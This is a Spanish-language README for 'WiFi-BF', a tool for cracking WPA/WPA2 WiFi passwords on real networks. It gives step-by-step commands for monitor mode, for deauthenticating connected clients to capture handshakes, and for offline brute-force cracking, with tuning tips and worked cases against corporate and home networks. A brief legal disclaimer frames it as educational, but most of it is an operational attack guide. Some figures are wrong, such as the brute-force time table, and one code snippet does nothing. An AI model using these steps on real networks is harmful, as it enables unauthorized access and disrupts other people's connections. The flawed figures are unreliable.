# WiFi-BF - Guía de Ataque a Redes WiFi Reales

Documentación completa para atacar redes WPA/WPA2 en entornos reales.

---

## ADVERTENCIA LEGAL IMPORTANTE

**SOLO USAR EN REDES PROPIAS O CON AUTORIZACIÓN EXPLÍCITA POR ESCRITO**

- El acceso no autorizado a sistemas/redes es **ILEGAL**
- Puede resultar en cargos criminales graves
- WiFi-BF es una herramienta educativa para aprender sobre seguridad
- El usuario es responsable de su uso

---

## Tabla de contenidos

1. [Diferencias vs Testing](#diferencias-vs-testing)
2. [Arquitectura del ataque](#arquitectura-del-ataque)
3. [Requisitos técnicos](#requisitos-técnicos)
4. [Proceso paso a paso](#proceso-paso-a-paso)
5. [Métodos de ataque](#métodos-de-ataque)
6. [Optimización](#optimización)
7. [Análisis de resultados](#análisis-de-resultados)

---

## Diferencias vs Testing

### Testing (versión anterior)

```bash
# Comparación directa contra string
python3 wifi_bf.py --target "password123"
# Rápido, sin captura, solo validación local
```

### WiFi Real (versión actual)

```bash
# Captura real + validación contra handshake
sudo python3 wifi_bf.py -i wlan0 --attack "ESSID" "AA:BB:CC:DD:EE:FF"
# Lento, captura real, validación criptográfica
```

---

## Arquitectura del ataque

### Flujo completo

```
┌─────────────────────────────────────────────────────────────┐
│                                                             │
│  1. ESCANEO DE REDES (Passive)                            │
│     └─> airodump-ng detecta redes disponibles             │
│                                                             │
│  2. SELECCIÓN DE TARGET                                   │
│     └─> Usuario elige ESSID + BSSID                       │
│                                                             │
│  3. CAPTURA DE HANDSHAKE (Active)                         │
│     ├─> Switchear a modo monitor                          │
│     ├─> Airodump-ng captura paquetes                      │
│     └─> Aireplay-ng envía deauth para forzar 4-way       │
│         handshake                                          │
│                                                             │
│  4. VALIDACIÓN DEL HANDSHAKE                              │
│     └─> Verificar que PCAP contiene 4 mensajes           │
│         de handshake completo                             │
│                                                             │
│  5. ATAQUE (Offline)                                      │
│     ├─> Generar candidatos (fuerza bruta)                │
│     ├─> Para cada candidato:                              │
│     │   ├─> Calcular PMK con PBKDF2-HMAC-SHA1            │
│     │   ├─> Derivar PTK                                   │
│     │   ├─> Comparar MIC contra handshake capturado       │
│     │   └─> Si match: ENCONTRADA                          │
│     └─> Reportar resultado                                │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## Requisitos técnicos

### Hardware

- **Interfaz WiFi principal**: Para escaneo
- **Interfaz WiFi USB**: Para ataque (recomendado)
  - Mejor separacion entre actividades
  - Evita desconexión durante ataque

### Software

Instalado automáticamente con `setup_linux.sh`:

```
aircrack-ng     # Suite principal
airodump-ng     # Escaneo y captura
airmon-ng       # Control de modo monitor
aireplay-ng     # Inyección de paquetes
python3         # Ambiente de ejecución
```

### Conocimiento

- Conceptos básicos de WiFi
- Diferencia entre WPA/WPA2
- Qué es un handshake WPA
- Criptografía básica (PMK, PTK, MIC)

---

## Proceso paso a paso

### 1. Preparación

```bash
cd ~/wifi-bf
sudo su -  # Ejecutar como root (más eficiente)
export INTERFACE=wlan0
```

### 2. Escaneo de redes

```bash
python3 wifi_bf.py -i $INTERFACE --scan
```

**Interpretación de salida:**

```
Num   ESSID          BSSID                Power    Encrypt   
1     MiRed          AA:BB:CC:DD:EE:FF    -35      WPA2      
2     TuRed          11:22:33:44:55:66    -65      WPA       
```

- **Power -35**: Fuerte señal (cerca del AP)
- **Power -65**: Señal débil (lejos del AP)
- **WPA2**: Standard actual (2004+), más lento de crackear
- **WPA**: Standard anterior (2003), más rápido

### 3. Seleccionar target

```bash
TARGET_ESSID="MiRed"
TARGET_BSSID="AA:BB:CC:DD:EE:FF"
```

### 4. Capturar handshake

```bash
python3 wifi_bf.py -i $INTERFACE --attack "$TARGET_ESSID" "$TARGET_BSSID"
```

**Fases:**

```
[1] Cambiar a modo monitor
    └─> Se pausa conectividad normal
    
[2] Capturar tráfico
    └─> Busca 4-way handshake
    
[3] Forzar handshake (deauth)
    └─> Desconecta clientes conectados
    └─> Ofrece esperar reconexión
    └─> Se captura handshake en reconexión
    
[4] Verificar handshake
    └─> Confirma que hay 4 mensajes
    └─> Procede a ataque offline
```

**Estimación de tiempo:**

- Con clientes activos: 5-15 segundos
- Sin clientes conectados: 30+ segundos (esperar cliente)
- Con señal débil: 30+ segundos

### 5. Ataque offline

Una vez capturado el handshake:

```
[INFO] Handshake capturado: logs/captures/handshakes/handshake_MiRed_20260227_143000-01.pcap
[INFO] Iniciando ataque con método: brute-force
[INFO] Estimado: 4.85 millones de combinaciones en 8-20 caracteres

Intentos: 50,234 | Velocidad: 245.5 intentos/seg
Intentos: 100,567 | Velocidad: 248.1 intentos/seg
...
[INFO] Contraseña encontrada!
```

**Velocidad esperada:**

- Con aircrack-ng: 10,000-50,000 intentos/seg (CPU fuerte)
- Rango típico: 8-12 caracteres
- Tiempo estimado: minutos a horas (depende de la contraseña)

### 6. Interpretar resultado

```bash
# Ver reporte
cat logs/reports/report_brute-force_*.txt

# O JSON para programación
cat logs/reports/report_brute-force_*.json
```

---

## Métodos de ataque

### 1. Fuerza Bruta (brute-force)

**Cómo funciona:**
- Prueba TODAS las combinaciones posibles
- Orden: a, b, c, ..., z, aa, ab, ..., az, ba, ...
- Garantizado encontrar contraseña (si existe)

**Parámetros:**
```bash
--min-length 8      # Empezar en 8 caracteres
--max-length 16     # Terminar en 16 caracteres
--charset "..."     # Caracteres a probar
```

**Charset recomendados:**

```bash
# Números + minúsculas (36 caracteres)
--charset "0123456789abcdefghijklmnopqrstuvwxyz"

# Números + mayúsculas + minúsculas (62 caracteres)
--charset "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

# Números + minúsculas + algunos símbolos (50 caracteres)
--charset "0123456789abcdefghijklmnopqrstuvwxyz!@#$%^&*"
```

**Ejemplo completo:**

```bash
python3 wifi_bf.py -i wlan0 \
    --attack "MiRed" "AA:BB:CC:DD:EE:FF" \
    --threads 8 \
    --min-length 8 \
    --max-length 12 \
    --charset "0123456789abcdefghijklmnopqrstuvwxyz"
```

**Tiempo estimado:**

| Longitud | Charset (62 chars) | Tiempo @ 10K/s |
|----------|-------------------|----------------|
| 8        | 218 billones      | 5 horas        |
| 9        | 13.5 trillones    | 312 horas      |
| 10       | 839 trillones     | 26,000 horas   |

**Conclusión:** Fuerza bruta solo viable para:
- Rango pequeño (8-10 caracteres)
- Charset pequeño (solo números)
- O si se sabe la longitud/patrón

### 2. Diccionario (próxímo en versión 2)

**Cómo funciona:**
- Prueba palabras de un diccionario
- Mucho más rápido que fuerza bruta
- Limitado a palabras conocidas

**Ejemplo (cuando disponible):**
```bash
python3 wifi_bf.py -i wlan0 \
    --method dictionary \
    --attack "MiRed" "AA:BB:CC:DD:EE:FF" \
    --wordlist "rockyou.txt"
```

### 3. Heurístico (próximamente)

**Cómo funciona:**
- Variaciones inteligentes de palabras
- Test -> Test2025, Test123, t3st, etc
- Balance entre velocidad y cobertura

---

## Optimización

### Velocidad máxima

```bash
# Aumentar hilos (según CPU)
--threads 16

# Charset mínimo
--charset "0123456789"

# Rango acotado
--min-length 8 --max-length 8

# Máquina exclusivamente para esto
priority +20  # Aumentar prioridad
```

**Resultado:** 50,000-100,000 intentos/seg

### Precisión máxima

```bash
# Charset completo (símbolos incluidos)
--charset "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()"

# Rango amplio
--min-length 8 --max-length 20

# Esperar captura segura
CAPTURE_TIMEOUT=300  # 5 minutos
```

---

## Análisis de resultados

### Reporte de texto

```
======================================================================
REPORTE DE CRACKING - WiFi-BF
======================================================================

RESULTADO: CONTRASEÑA ENCONTRADA
  Contraseña: Pa******

Método: brute-force
Intentos: 450,234
Velocidad: 245.5 intentos/seg
Duración: 30 min 42 seg

Hilos: 4
Memoria pico: 125 MB
CPU promedio: 87.3%

======================================================================
```

### Interpretación

| Campo | Significado |
|-------|------------|
| Contraseña | Está enmascarada por seguridad |
| Intentos | Cuántos candidatos se probaron |
| Velocidad | Intentos por segundo |
| Duración | Tiempo total del ataque |
| Hilos | Paralelismo utilizado |
| Memoria | RAM máximo consumido |
| CPU | Utilización promedio |

### Extracción de contraseña real

**En el reporte JSON:**

```bash
cat logs/reports/report_brute-force_*.json | grep "password"
```

**O en logs:**

```bash
grep "KEY FOUND" logs/wifi_bf.log
```

---

## Casos de estudio

### Caso 1: Red corporativa fuerte

```
ESSID: "CorporateNetwork"
Señal: -35 dBm (fuerte)
Clientes: Múltiples activos
Contraseña: ComplexPass123!

Comando recomendado:
python3 wifi_bf.py -i wlan0 --attack "CorporateNetwork" "BSSID" \
    --method dictionary --wordlist corporate_passwords.txt \
    --threads 8

Tiempo estimado: 5-30 minutos
Probabilidad: 70% (depende palabras en diccionario)
```

### Caso 2: Red doméstica típica

```
ESSID: "HomeWiFi"
Señal: -55 dBm (moderado)
Clientes: 2-3 conectados
Contraseña: Home123456

Comando recomendado:
python3 wifi_bf.py -i wlan0 --attack "HomeWiFi" "BSSID" \
    --threads 4 \
    --min-length 8 --max-length 12 \
    --charset "0123456789abcdefghijklmnopqrstuvwxyz"

Tiempo estimado: 15-45 minutos
Probabilidad: 80% (patrón común)
```

### Caso 3: Red protegida

```
ESSID: "ProtectedNet"
Señal: -70 dBm (débil)
Clientes: Sin clientes visibles
Contraseña: RandomString_!2#3

Comando recomendado:
python3 wifi_bf.py -i wlan0 --attack "ProtectedNet" "BSSID" \
    --threads 8 \
    --min-length 16 --max-length 20 \
    --charset "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()"

Tiempo estimado: Horas o días
Probabilidad: 10% (muy segura)
Recomendación: Usar diccionario cuando disponible
```

---

## FAQ

**P: ¿Por qué tarda tanto?**

R: WPA/WPA2 usa PBKDF2 (4096 iteraciones) + validación. Cada intento requiere:
- Calcular PMK (caro)
- Derivar PTK
- Validar MIC
- Total: milisegundos por intento

**P: ¿Puedo parar y reanudar?**

R: Sí. El programa guarda checkpoints automáticamente. Usa:
```bash
# Reanudar ataque pausado
sudo python3 wifi_bf.py -i wlan0 --resume
```

**P: ¿Qué pasa si me desconecto?**

R: Los checkpoints se guardan en `logs/checkpoints/`. Puedes:
1. Reconectar a WSL2
2. Reanudar el ataque
3. Continuar desde donde se pausó

**P: ¿Funciona contra WPA3?**

R: No. WPA3 usa SAE (Simultaneous Authentication of Equals), mucho más seguro.
WiFi-BF solo soporta WPA/WPA2.

**P: ¿Mi contraseña es segura?**

R: Pruébala:
```bash
python3 -c "
charset = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#\$%^&*()'
pwd = 'TuContraseña'
# Si la contraseña está acá, probablemente se can en diccionarios comunes
"
```

---

## Próximos pasos educativos

1. Implementar defensecontra ataques WiFi
2. Crear pruebas de intrusión correctas
3. Documentar mejores prácticas de seguridad
4. Estudiar WPA3 y sus mejoras

---

**Última actualización:** Febrero 2026
**Para uso exclusivamente educativo y autorizado**
